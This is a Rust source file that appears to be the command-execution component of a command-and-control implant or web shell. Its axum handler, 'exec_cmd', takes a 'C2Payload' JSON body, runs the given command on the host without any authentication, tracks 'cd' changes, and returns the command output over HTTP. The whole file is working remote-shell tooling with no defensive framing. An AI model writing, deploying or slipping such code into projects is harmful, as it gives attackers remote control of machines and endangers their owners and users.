use crate::ShellState;
use axum::{response::Html, Extension, Json};
use serde::Deserialize;
use std::sync::{Arc, Mutex};

#[derive(Deserialize)]
pub struct C2Payload {
    cmd: String,
}

pub async fn exec_cmd<'a>(
    Extension(ext): Extension<Arc<Mutex<ShellState>>>,
    Json(body): Json<C2Payload>,
) -> Html<String> {
    let mut cmdvec = body.cmd.split_whitespace();
    let cmd_bin_name = cmdvec.next().unwrap();

    let output = if cmd_bin_name == "cd" {
        ShellState::manage_path(&mut ext.lock().unwrap(), cmdvec.collect::<Vec<&str>>());
        "".to_string()
    } else {
        let builder = std::process::Command::new(cmd_bin_name)
            .args(cmdvec.collect::<Vec<&str>>())
            .current_dir(&ext.lock().unwrap().pwd)
            .output();

        match builder {
            Ok(op) => format!(
                "{}\n{}",
                String::from_utf8(op.stdout).unwrap(),
                String::from_utf8(op.stderr).unwrap()
            ),
            Err(_) => String::from("command not found"),
        }
    };

    Html(output)
}
